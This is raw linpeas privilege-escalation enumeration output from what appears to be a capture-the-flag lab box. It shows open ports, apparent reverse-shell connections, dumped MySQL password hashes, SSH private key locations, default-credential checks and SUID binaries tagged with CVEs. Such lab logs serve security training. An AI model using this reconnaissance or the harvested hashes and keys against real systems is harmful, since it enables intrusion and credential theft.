Mon 2024-08-19 00:00:00 PDT  4 days left   Wed 2024-08-14 03:07:07 PDT  1h 31min ago fstrim.timer                 fstrim.service
n/a                          n/a           n/a                          n/a          snapd.snap-repair.timer      snapd.snap-repair.service
n/a                          n/a           n/a                          n/a          ureadahead-stop.timer        ureadahead-stop.service

[+] Analyzing .timer files
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#timers

[+] Analyzing .socket files
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sockets

[+] HTTP sockets
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sockets
Socket /run/user/1000/snapd-session-agent.socket owned by bismuth uses HTTP. Response to /index:
{"type":"error","result":{"message":"method \"GET\" not allowed"}}
Socket /run/snapd.socket owned by root uses HTTP. Response to /index:
{"type":"sync","status-code":200,"status":"OK","result":["TBD"]}
Socket /run/snapd-snap.socket owned by root uses HTTP. Response to /index:
{"type":"error","status-code":403,"status":"Forbidden","result":{"message":"access denied","kind":"login-required"}}

[+] D-Bus config files
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#d-bus
Possible weak user policy found on /etc/dbus-1/system.d/dnsmasq.conf (        <policy user="dnsmasq">)

[+] D-Bus Service Objects list
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#d-bus
NAME                                 PID PROCESS         USER             CONNECTION    UNIT                      SESSION    DESCRIPTION        
:1.0                                 490 systemd-network systemd-network  :1.0          systemd-networkd.service  -          -                  
:1.10                               1024 unattended-upgr root             :1.10         unattended-upgrades.se\u2026ce -          -                  
:1.184                              3921 systemd         bismuth          :1.184        user@1000.service         -          -                  
:1.185                              9474 snapd           root             :1.185        snapd.service             -          -                  
:1.186                              9542 systemd-timedat root             :1.186        systemd-timedated.service -          -                  
:1.188                              9640 busctl          bismuth          :1.188        session-10.scope          10         -                  
:1.2                                   1 systemd         root             :1.2          init.scope                -          -                  
:1.3                                 867 accounts-daemon root             :1.3          accounts-daemon.service   -          -                  
:1.4                                 878 systemd-logind  root             :1.4          systemd-logind.service    -          -                  
:1.6                                 908 polkitd         root             :1.6          polkit.service            -          -                  
:1.7                                 941 systemd-resolve systemd-resolve  :1.7          systemd-resolved.service  -          -                  
:1.8                                 863 networkd-dispat root             :1.8          networkd-dispatcher.se\u2026ce -          -                  
com.ubuntu.LanguageSelector            - -               -                (activatable) -                         -         
com.ubuntu.SoftwareProperties          - -               -                (activatable) -                         -         
io.netplan.Netplan                     - -               -                (activatable) -                         -         
org.freedesktop.Accounts             867 accounts-daemon root             :1.3          accounts-daemon.service   -          -                  
 -- UID=0 EUID=0 
org.freedesktop.DBus                   1 systemd         root             -             init.scope                -          -                  
org.freedesktop.PolicyKit1           908 polkitd         root             :1.6          polkit.service            -          -                  
org.freedesktop.hostname1              - -               -                (activatable) -                         -         
org.freedesktop.locale1                - -               -                (activatable) -                         -         
org.freedesktop.login1               878 systemd-logind  root             :1.4          systemd-logind.service    -          -                  
org.freedesktop.network1             490 systemd-network systemd-network  :1.0          systemd-networkd.service  -          -                  
org.freedesktop.resolve1             941 systemd-resolve systemd-resolve  :1.7          systemd-resolved.service  -          -                  
org.freedesktop.systemd1               1 systemd         root             :1.2          init.scope                -          -                  
org.freedesktop.timedate1           9542 systemd-timedat root             :1.186        systemd-timedated.service -          -                  


===================================( Network Information )====================================
[+] Hostname, hosts and DNS
catpictures-ii
127.0.0.1	localhost
127.0.1.1	catpictures-ii

::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters

nameserver 127.0.0.53
search eu-west-1.compute.internal

[+] Content of /etc/inetd.conf & /etc/xinetd.conf
/etc/inetd.conf Not Found

[+] Networks and neighbours
# symbolic names for networks, see networks(5) for more information
link-local 169.254.0.0
br-9a1d48437b59: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.18.0.1  netmask 255.255.0.0  broadcast 172.18.255.255
        inet6 fe80::42:a6ff:fe9d:99a9  prefixlen 64  scopeid 0x20<link>
        ether 02:42:a6:9d:99:a9  txqueuelen 0  (Ethernet)
        RX packets 19296  bytes 8511087 (8.5 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 19474  bytes 1528632 (1.5 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

docker0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.17.0.1  netmask 255.255.0.0  broadcast 172.17.255.255
        inet6 fe80::42:bff:fe6d:5fcd  prefixlen 64  scopeid 0x20<link>
        ether 02:42:0b:6d:5f:cd  txqueuelen 0  (Ethernet)
        RX packets 715  bytes 22271919 (22.2 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 996  bytes 81669 (81.6 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 9001
        inet 10.10.121.66  netmask 255.255.0.0  broadcast 10.10.255.255
        inet6 fe80::1d:d3ff:fec8:ba17  prefixlen 64  scopeid 0x20<link>
        ether 02:1d:d3:c8:ba:17  txqueuelen 1000  (Ethernet)
        RX packets 27586  bytes 2485997 (2.4 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 27308  bytes 32706924 (32.7 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 12359  bytes 4024740 (4.0 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 12359  bytes 4024740 (4.0 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

veth2b32c8c: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet6 fe80::34ab:60ff:fefa:c46e  prefixlen 64  scopeid 0x20<link>
        ether 36:ab:60:fa:c4:6e  txqueuelen 0  (Ethernet)
        RX packets 715  bytes 22281929 (22.2 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 1012  bytes 82885 (82.8 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

vethe9d618c: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet6 fe80::dc80:6bff:feea:9353  prefixlen 64  scopeid 0x20<link>
        ether de:80:6b:ea:93:53  txqueuelen 0  (Ethernet)
        RX packets 19296  bytes 8781231 (8.7 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 19490  bytes 1529848 (1.5 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

Kernel IP routing table
Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
default         ip-10-10-0-1.eu 0.0.0.0         UG    0      0        0 eth0
default         ip-10-10-0-1.eu 0.0.0.0         UG    100    0        0 eth0
10.10.0.0       0.0.0.0         255.255.0.0     U     0      0        0 eth0
ip-10-10-0-1.eu 0.0.0.0         255.255.255.255 UH    100    0        0 eth0
172.17.0.0      0.0.0.0         255.255.0.0     U     0      0        0 docker0
172.18.0.0      0.0.0.0         255.255.0.0     U     0      0        0 br-9a1d48437b59

[+] Iptables rules
iptables rules Not Found

[+] Active Ports
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#internal-open-ports
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:8080            0.0.0.0:*               LISTEN      880/python3         
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:3000            0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:1338          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:1339          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:1340          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:222             0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:8000            0.0.0.0:*               LISTEN      4117/python3        
tcp        0      0 127.0.0.1:1339          127.0.0.1:36642         ESTABLISHED -                   
tcp        0      0 127.0.0.1:36642         127.0.0.1:1339          ESTABLISHED -                   
tcp        0      0 127.0.0.1:1338          127.0.0.1:51286         ESTABLISHED -                   
tcp        1      0 10.10.121.66:59400      10.10.217.19:9492       CLOSE_WAIT  4083/bash           
tcp        0      1 10.10.121.66:52506      185.125.188.58:443      SYN_SENT    -                   
tcp        0      0 127.0.0.1:43630         127.0.0.1:22            ESTABLISHED -                   
tcp        0      0 127.0.0.1:51286         127.0.0.1:1338          ESTABLISHED -                   
tcp        0      0 127.0.0.1:22            127.0.0.1:43630         ESTABLISHED -                   
tcp        0      0 10.10.121.66:22         10.10.217.19:41086      ESTABLISHED -                   
tcp        0      0 10.10.121.66:41490      10.10.217.19:9492       ESTABLISHED 4238/bash           
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
tcp6       0      0 :::3000                 :::*                    LISTEN      -                   
tcp6       0      0 :::1337                 :::*                    LISTEN      -                   
tcp6       0      0 :::222                  :::*                    LISTEN      -                   
tcp6       0      0 10.10.121.66:1337       10.10.217.19:35076      TIME_WAIT   -                   
tcp6       0      0 10.10.121.66:1337       10.10.217.19:50710      TIME_WAIT   -                   
tcp6       0      0 10.10.121.66:1337       10.10.217.19:40990      TIME_WAIT   -                   
tcp6       0      0 10.10.121.66:1337       10.10.217.19:60400      TIME_WAIT   -                   
tcp6       0      0 10.10.121.66:1337       10.10.217.19:52426      TIME_WAIT   -                   
tcp6       0      0 10.10.121.66:1337       10.10.217.19:60414      TIME_WAIT   -                   
tcp6       0      0 10.10.121.66:1337       10.10.217.19:59230      TIME_WAIT   -                   
tcp6       0      0 10.10.121.66:1337       10.10.217.19:52248      TIME_WAIT   -                   
tcp6       0      0 10.10.121.66:1337       10.10.217.19:35078      TIME_WAIT   -                   
tcp6       0      0 10.10.121.66:1337       10.10.217.19:40980      TIME_WAIT   -                   
tcp6       0      0 10.10.121.66:1337       10.10.217.19:60442      TIME_WAIT   -                   
tcp6       0      0 10.10.121.66:1337       10.10.217.19:52252      TIME_WAIT   -                   
tcp6       0      0 10.10.121.66:1337       10.10.217.19:50714      TIME_WAIT   -                   
tcp6       0      0 10.10.121.66:1337       10.10.217.19:35072      TIME_WAIT   -                   
tcp6       0      0 10.10.121.66:1337       10.10.217.19:59222      TIME_WAIT   -                   
tcp6       0      0 10.10.121.66:1337       10.10.217.19:60428      TIME_WAIT   -                   
tcp6       0      0 10.10.121.66:1337       10.10.217.19:52240      TIME_WAIT   -                   
tcp6       0      0 10.10.121.66:1337       10.10.217.19:50702      TIME_WAIT   -                   
tcp6       0      0 10.10.121.66:1337       10.10.217.19:41000      TIME_WAIT   -                   
tcp6       0      0 10.10.121.66:1337       10.10.217.19:59212      TIME_WAIT   -                   
tcp6       0      0 10.10.121.66:1337       10.10.217.19:59224      TIME_WAIT   -                   
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
udp        0      0 10.10.121.66:68         0.0.0.0:*                           -                   
udp        0      0 0.0.0.0:68              0.0.0.0:*                           -                   

[+] Can I sniff with tcpdump?
No


====================================( Users Information )=====================================
[+] My user
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#groups
uid=1000(bismuth) gid=1000(bismuth) groups=1000(bismuth),4(adm),24(cdrom),30(dip),46(plugdev),115(lpadmin),116(sambashare)

[+] Do I have PGP keys?

[+] Clipboard or highlighted text?
xsel and xclip Not Found

[+] Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#commands-with-sudo-and-suid-commands

[+] Checking /etc/doas.conf
/etc/doas.conf Not Found

[+] Checking Pkexec policy

[Configuration]
AdminIdentities=unix-user:0
[Configuration]
AdminIdentities=unix-group:sudo;unix-group:admin

[+] Do not forget to test 'su' as any other user with shell: without password and with their names as password (I can't do it...)
[+] Do not forget to execute 'sudo -l' without password or with valid password (if you know it)!!

[+] Superusers
root:x:0:0:root:/root:/bin/bash

[+] Users with console
bismuth:x:1000:1000:bismuth,,,:/home/bismuth:/bin/bash
root:x:0:0:root:/root:/bin/bash

[+] All users & groups
uid=0(root) gid=0(root) groups=0(root)
uid=1000(bismuth) gid=1000(bismuth) groups=1000(bismuth),4(adm),24(cdrom),30(dip),46(plugdev),115(lpadmin),116(sambashare)
uid=100(systemd-timesync) gid=102(systemd-timesync) groups=102(systemd-timesync)
uid=101(systemd-network) gid=103(systemd-network) groups=103(systemd-network)
uid=102(systemd-resolve) gid=104(systemd-resolve) groups=104(systemd-resolve)
uid=103(pollinate) gid=1(daemon) groups=1(daemon)
uid=104(syslog) gid=108(syslog) groups=108(syslog),4(adm)
uid=105(_apt) gid=65534(nogroup) groups=65534(nogroup)
uid=106(lxd) gid=65534(nogroup) groups=65534(nogroup)
uid=107(messagebus) gid=111(messagebus) groups=111(messagebus)
uid=108(uuidd) gid=112(uuidd) groups=112(uuidd)
uid=109(dnsmasq) gid=65534(nogroup) groups=65534(nogroup)
uid=10(uucp) gid=10(uucp) groups=10(uucp)
uid=110(sshd) gid=65534(nogroup) groups=65534(nogroup)
uid=111(landscape) gid=105(landscape) groups=105(landscape)
uid=13(proxy) gid=13(proxy) groups=13(proxy)
uid=1(daemon) gid=1(daemon) groups=1(daemon)
uid=2(bin) gid=2(bin) groups=2(bin)
uid=33(www-data) gid=33(www-data) groups=33(www-data)
uid=34(backup) gid=34(backup) groups=34(backup)
uid=38(list) gid=38(list) groups=38(list)
uid=39(irc) gid=39(irc) groups=39(irc)
uid=3(sys) gid=3(sys) groups=3(sys)
uid=41(gnats) gid=41(gnats) groups=41(gnats)
uid=4(sync) gid=65534(nogroup) groups=65534(nogroup)
uid=5(games) gid=60(games) groups=60(games)
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
uid=6(man) gid=12(man) groups=12(man)
uid=7(lp) gid=7(lp) groups=7(lp)
uid=8(mail) gid=8(mail) groups=8(mail)
uid=9(news) gid=9(news) groups=9(news)

[+] Login now
 04:39:07 up  1:32,  3 users,  load average: 0.53, 0.21, 0.07
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
bismuth  pts/3    127.0.0.1        04:29    9:40   0.11s  0.03s bash -i
bismuth  pts/1    127.0.0.1        04:22   16:59   0.27s  0.13s python3 -m http.server
bismuth  pts/4    10.10.217.19     04:30   58.00s  0.21s  0.00s w

[+] Last logons
root     pts/1        192.168.1.254    Mon Nov  7 09:46 - crash  (00:01)
root     pts/0        192.168.1.254    Mon Nov  7 09:46 - crash  (00:01)
reboot   system boot  4.4.0-210-generi Mon Nov  7 09:46 - 09:37 (125+22:51)
root     pts/0        192.168.1.254    Mon Nov  7 09:26 - crash  (00:20)
root     pts/1        192.168.1.254    Mon Nov  7 09:11 - crash  (00:34)
bismuth  pts/0        192.168.1.254    Mon Nov  7 09:10 - 09:11  (00:01)
bismuth  tty1                          Mon Nov  7 09:10 - crash  (00:36)
reboot   system boot  4.4.0-186-generi Mon Nov  7 09:09 - 09:37 (125+23:27)

wtmp begins Mon Nov  7 09:09:52 2022

[+] Last time logon each user
Username         Port     From             Latest
root             pts/0    192.168.1.254    Mon Mar 27 08:37:40 -0700 2023
bismuth          pts/4    10.10.217.19     Wed Aug 14 04:30:59 -0700 2024

[+] Password policy
PASS_MAX_DAYS	99999
PASS_MIN_DAYS	0
PASS_WARN_AGE	7
ENCRYPT_METHOD SHA512


===================================( Software Information )===================================
[+] MySQL version
mysql Not Found

[+] MySQL connection using default root/root ........... No
[+] MySQL connection using root/toor ................... No
[+] MySQL connection using root/NOPASS ................. No
[+] Searching mysql credentials and exec
From '/usr/lib/python2.7/dist-packages/ansible/modules/database/mysql/mysql_replication.py' Mysql user:             login_user=dict(default=None),
            master_user=dict(default=None),
    master_user = module.params["master_user"]
    login_user = module.params["login_user"]
        cursor = mysql_connect(module, login_user, login_password, config_file, ssl_cert, ssl_key, ssl_ca, None, 'MySQLdb.cursors.DictCursor',
            module.fail_json(msg="unable to connect to database, check login_user and login_password are correct or %s has the credentials. "
            chm.append("MASTER_USER=%(master_user)s")
            chm_params['master_user'] = master_user
From '/usr/lib/python2.7/dist-packages/ansible/modules/database/mysql/mysql_user.py' Mysql user:         cursor.execute("SELECT count(*) FROM user WHERE user = %s", ([user]))
        cursor.execute("SELECT count(*) FROM user WHERE user = %s AND host = %s", (user, host))
        hostnames = user_get_hostnames(cursor, [user])
            old_user_mgmt = server_version_check(cursor)
                cursor.execute("SELECT password FROM user WHERE user = %s AND host = %s", (user, host))
                cursor.execute("SELECT authentication_string FROM user WHERE user = %s AND host = %s", (user, host))
                            cursor.execute("SET PASSWORD FOR %s@%s = %s", (user, host, password))
                        cursor.execute("SET PASSWORD FOR %s@%s = PASSWORD(%s)", (user, host, password))
            curr_priv = privileges_get(cursor, user, host)
                    if user != "root" and "PROXY" not in priv and not append_privs:
        hostnames = user_get_hostnames(cursor, [user])
    cursor.execute("SELECT Host FROM mysql.user WHERE user = %s", user)
            login_user=dict(default=None),
            user=dict(required=True, aliases=['name']),
    login_user = module.params["login_user"]
    user = module.params["user"]
            cursor = mysql_connect(module, login_user, login_password, config_file, ssl_cert, ssl_key, ssl_ca, db,
        module.fail_json(msg="unable to connect to database, check login_user and login_password are correct or %s has the credentials. "
                    changed = user_mod(cursor, user, host, host_all, password, encrypted, priv, append_privs, module)
                    changed = user_mod(cursor, user, host, host_all, None, encrypted, priv, append_privs, module)
                module.fail_json(msg="host_all parameter cannot be used when adding a user")
                changed = user_add(cursor, user, host, host_all, password, encrypted, priv, module.check_mode)
            changed = user_delete(cursor, user, host, host_all, module.check_mode)
    module.exit_json(changed=changed, user=user)
From '/usr/lib/python2.7/dist-packages/ansible/modules/database/mysql/mysql_db.py' Mysql user: def db_dump(module, host, user, password, db_name, target, all_databases, port, config_file, socket=None, ssl_cert=None, ssl_key=None, ssl_ca=None,
        cmd += " --user=%s" % pipes.quote(user)
def db_import(module, host, user, password, db_name, target, all_databases, port, config_file, socket=None, ssl_cert=None, ssl_key=None, ssl_ca=None):
        cmd.append("--user=%s" % pipes.quote(user))
            login_user=dict(default=None),
    login_user = module.params["login_user"]
        cursor = mysql_connect(module, login_user, login_password, config_file, ssl_cert, ssl_key, ssl_ca,
            module.fail_json(msg="unable to connect to database, check login_user and login_password are correct or %s has the credentials. "
                rc, stdout, stderr = db_dump(module, login_host, login_user,
                rc, stdout, stderr = db_import(module, login_host, login_user,
                        rc, stdout, stderr = db_import(module, login_host, login_user,
From '/usr/lib/python2.7/dist-packages/ansible/modules/database/mysql/mysql_user.pyc' Mysql user: 
From '/usr/lib/python2.7/dist-packages/ansible/modules/database/mysql/mysql_db.pyc' Mysql user: 
From '/usr/lib/python2.7/dist-packages/ansible/modules/database/mysql/mysql_variables.py' Mysql user:             login_user=dict(default=None),
    user = module.params["login_user"]
        cursor = mysql_connect(module, user, password, config_file, ssl_cert, ssl_key, ssl_ca, db,
            module.fail_json(msg="unable to connect to database, check login_user and login_password are correct or %s has the credentials. "
We can read the Mysql Hashes from /var/lib/mysql/mysql/user.MYD
localhost
root
e7128b67d9e7
root
127.0.0.1
root
root
localhost
debian-sys-maint*015CC53362CDFB4ECD2CE756876D4A235EBE8E75
localhost
lychee*4E1E4103B94B2548A6A11F31EFEFF7910DDB13D3

[+] PostgreSQL version and pgadmin credentials
 Not Found

[+] PostgreSQL connection to template0 using postgres/NOPASS ........ No
[+] PostgreSQL connection to template1 using postgres/NOPASS ........ No
[+] PostgreSQL connection to template0 using pgsql/NOPASS ........... No
[+] PostgreSQL connection to template1 using pgsql/NOPASS ........... No

[+] Apache server info
 Not Found

[+] Searching PHPCookies
 Not Found

[+] Searching Wordpress wp-config.php files
wp-config.php Not Found

[+] Searching Drupal settings.php files
/default/settings.php Not Found

[+] Searching Tomcat users file
tomcat-users.xml Not Found

[+] Mongo information
 Not Found

[+] Searching supervisord configuration file
supervisord.conf Not Found

[+] Searching cesi configuration file
cesi.conf Not Found

[+] Searching Rsyncd config file
/usr/share/doc/rsync/examples/rsyncd.conf
[ftp]
	comment = public archive
	path = /var/www/pub
	use chroot = yes
	lock file = /var/lock/rsyncd
	read only = yes
	list = yes
	uid = nobody
	gid = nogroup
	strict modes = yes
	ignore errors = no
	ignore nonreadable = yes
	transfer logging = no
	timeout = 600
	refuse options = checksum dry-run
	dont compress = *.gz *.tgz *.zip *.z *.rpm *.deb *.iso *.bz2 *.tbz

[+] Searching Hostapd config file
hostapd.conf Not Found

[+] Searching wifi conns file
 Not Found

[+] Searching Anaconda-ks config files
anaconda-ks.cfg Not Found

[+] Searching .vnc directories and their passwd files
.vnc Not Found

[+] Searching ldap directories and their hashes
/etc/ldap
/usr/lib/python2.7/dist-packages/ansible/modules/net_tools/ldap
The password hash is from the {SSHA} to 'structural'

[+] Searching .ovpn files and credentials
.ovpn Not Found

[+] Searching ssl/ssh files
/home/bismuth/.ssh/authorized_keys
/home/bismuth/.ssh/id_rsa
/home/bismuth/.ssh/id_rsa.pub
/home/bismuth/.ssh/known_hosts
ChallengeResponseAuthentication no
UsePAM yes
Possible private SSH keys were found!
/home/bismuth/.config/lxc/client.key
/home/bismuth/.ssh/id_rsa
  --> Some certificates were found (out limited):
/var/lib/lxd/server.crt
/etc/pollinate/entropy.ubuntu.com.pem
/home/bismuth/.config/lxc/client.crt

 --> /etc/hosts.allow file found, read the rules:



Searching inside /etc/ssh/ssh_config for interesting info
Host *
    SendEnv LANG LC_*
    HashKnownHosts yes
    GSSAPIAuthentication yes

[+] Searching unexpected auth lines in /etc/pam.d/sshd
No

[+] Searching Cloud credentials (AWS, Azure, GC)

[+] NFS exports?
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation/nfs-no_root_squash-misconfiguration-pe
/etc/exports Not Found

[+] Searching kerberos conf files and tickets
[i] https://book.hacktricks.xyz/pentesting/pentesting-kerberos-88#pass-the-ticket-ptt
krb5.conf Not Found
tickets kerberos Not Found
klist Not Found

[+] Searching Kibana yaml
kibana.yml Not Found

[+] Searching Knock configuration
Knock.config Not Found

[+] Searching logstash files
 Not Found

[+] Searching elasticsearch files
 Not Found

[+] Searching Vault-ssh files
vault-ssh-helper.hcl Not Found

[+] Searching AD cached hashes
cached hashes Not Found

[+] Searching screen sessions
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-shell-sessions
No Sockets found in /run/screen/S-bismuth.

[+] Searching tmux sessions
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-shell-sessions
tmux Not Found

[+] Searching Couchdb directory

[+] Searching redis.conf

[+] Searching dovecot files
dovecot credentials Not Found

[+] Searching mosquitto.conf

[+] Searching neo4j auth file

[+] Searching Cloud-Init conf file

[+] Searching Erlang cookie file

[+] Searching GVM auth file

[+] Searching IPSEC files


====================================( Interesting Files )=====================================
[+] SUID - Check easy privesc, exploits and write perms
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#commands-with-sudo-and-suid-commands
/bin/mount		--->	Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
/bin/su
/bin/umount		--->	BSD/Linux(08-1996)
/bin/ping
/bin/fusermount
/usr/bin/gpasswd
/usr/bin/at		--->	RTru64_UNIX_4.0g(CVE-2002-1614)
/usr/bin/chsh
/usr/bin/newgrp		--->	HP-UX_10.20
/usr/bin/pkexec		--->	Linux4.10_to_5.1.17(CVE-2019-13272)/rhel_6(CVE-2011-1485)
/usr/bin/passwd		--->	Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
/usr/bin/sudo		--->	/sudo$
/usr/bin/newuidmap
/usr/bin/traceroute6.iputils
/usr/bin/newgidmap
/usr/bin/chfn		--->	SuSE_9.3/10
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/snapd/snap-confine
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/eject/dmcrypt-get-device

[+] SGID
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#commands-with-sudo-and-suid-commands
/sbin/unix_chkpwd
/sbin/pam_extrausers_chkpwd
/usr/bin/at		--->	RTru64_UNIX_4.0g(CVE-2002-1614)
/usr/bin/mlocate
/usr/bin/chage
/usr/bin/ssh-agent
/usr/bin/wall
/usr/bin/bsd-write
/usr/bin/crontab
/usr/bin/expiry
/usr/lib/x86_64-linux-gnu/utempter/utempter

[+] Writable folders configured in /etc/ld.so.conf.d/
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#etc-ld-so-conf-d
/usr/local/lib
/usr/local/lib/x86_64-linux-gnu
/lib/x86_64-linux-gnu
/usr/lib/x86_64-linux-gnu

[+] Capabilities
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#capabilities
/usr/bin/mtr-packet = cap_net_raw+ep

[+] Users with capabilities
/etc/security/capability.conf Not Found

[+] Files with ACLs
files with acls in searched folders Not Found

[+] .sh files in path
/usr/bin/dockerd-rootless-setuptool.sh
/usr/bin/gettext.sh
/usr/bin/dockerd-rootless.sh

[+] Unexpected folders in root

[+] Files (scripts) in /etc/profile.d/
total 36
drwxr-xr-x   2 root root  4096 Mar 13  2023 .
drwxr-xr-x 107 root root 12288 Mar 27  2023 ..
-rw-r--r--   1 root root    96 Aug 13  2020 01-locale-fix.sh
-rw-r--r--   1 root root   835 Dec  1  2022 apps-bin-path.sh
-rw-r--r--   1 root root   664 Apr  1  2018 bash_completion.sh
-rw-r--r--   1 root root  1003 Dec 29  2015 cedilla-portuguese.sh
-rw-r--r--   1 root root  1557 Apr 14  2016 Z97-byobu.sh

[+] Hashes inside passwd file? ........... No
[+] Hashes inside group file? ............ No
[+] Credentials in fstab/mtab? ........... No
[+] Can I read shadow files? ............. No
[+] Can I read root folder? .............. No

[+] Searching root files in home dirs (limit 20)
/home

[+] Searching others files in folders owned by me

[+] Readable files belonging to root and readable by me but not world readable
-rw-r----- 1 root adm 31 Aug 10  2020 /var/log/fsck/checkfs
-rw-r----- 1 root adm 31 Aug 10  2020 /var/log/fsck/checkroot
-rw-r----- 1 root adm 31 Aug 10  2020 /var/log/dmesg
-rw-r----- 1 root adm 425781 Mar 13  2023 /var/log/apt/term.log

[+] Modified interesting files in the last 5mins (limit 100)
/home/bismuth/lin.out
/home/bismuth/.gnupg/crls.d/DIR.txt
/home/bismuth/.config/lxc/config.yml
/home/bismuth/linpeas.sh
/var/log/journal/8723c6bff27b9dbdb27493dc63693b3f/user-1000.journal
/var/log/journal/8723c6bff27b9dbdb27493dc63693b3f/system.journal
/var/log/kern.log
/var/log/syslog
/var/log/auth.log

[+] Writable log files (logrotten) (limit 100)
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#logrotate-exploitation

[+] Files inside /home/bismuth (limit 20)
total 380
drwxr-xr-x 8 bismuth bismuth   4096 Aug 14 04:38 .
drwxr-xr-x 3 root    root      4096 Nov  7  2022 ..
drwxr-xr-x 3 bismuth bismuth   4096 Nov  7  2022 .ansible
lrwxrwxrwx 1 bismuth bismuth      9 Nov  7  2022 .bash_history -> /dev/null
-rw-r--r-- 1 bismuth bismuth    220 Nov  7  2022 .bash_logout
-rw-r--r-- 1 bismuth bismuth   3771 Nov  7  2022 .bashrc
drwx------ 2 bismuth bismuth   4096 Nov  7  2022 .cache
drwxr-x--- 3 bismuth bismuth   4096 Nov  7  2022 .config
-rw-rw-r-- 1 bismuth bismuth     33 Mar 20  2023 flag2.txt
drwx------ 4 bismuth bismuth   4096 Aug 14 04:38 .gnupg
-rw------- 1 bismuth bismuth     43 Nov  7  2022 .lesshst
-rw-rw-r-- 1 bismuth bismuth  94819 Aug 14 04:39 lin.out
-rwxrwxr-x 1 bismuth bismuth 233380 Aug 14 04:37 linpeas.sh
drwxrwxr-x 2 bismuth bismuth   4096 Nov  7  2022 .nano
-rw-r--r-- 1 bismuth bismuth    655 Nov  7  2022 .profile
drwx------ 2 bismuth bismuth   4096 Nov  7  2022 .ssh
-rw-r--r-- 1 bismuth bismuth      0 Nov  7  2022 .sudo_as_admin_successful
-rw-rw-r-- 1 bismuth bismuth    182 Nov  7  2022 .wget-hsts

[+] Files inside others home (limit 20)

[+] Searching installed mail applications

[+] Mails (limit 50)

[+] Backup files?
-rw-r--r-- 1 root root 159 Mar 13  2023 /var/lib/sgml-base/supercatalog.old
-rw-r--r-- 1 root root 610 Mar 13  2023 /etc/xml/catalog.old
-rw-r--r-- 1 root root 673 Mar 13  2023 /etc/xml/xml-core.xml.old
-rw-rw-r-- 1 bismuth bismuth 55 Aug 14 04:26 /tmp/backupScript.sh

[+] Searching tables inside readable .db/.sqlite files (limit 100)
 -> Extracting tables from /var/lib/lxd/lxd.db (limit 20)


[+] Web files?(output limit)
/var/www/:
total 16K
drwxr-xr-x  4 root root 4.0K Nov  7  2022 .
drwxr-xr-x 14 root root 4.0K Nov  7  2022 ..
drwxr-xr-x  2 root root 4.0K Mar 27  2023 html
drwxr-xr-x  4 root root 4.0K Nov  7  2022 olivetin

/var/www/html:
total 16K
drwxr-xr-x 2 root root 4.0K Mar 27  2023 .

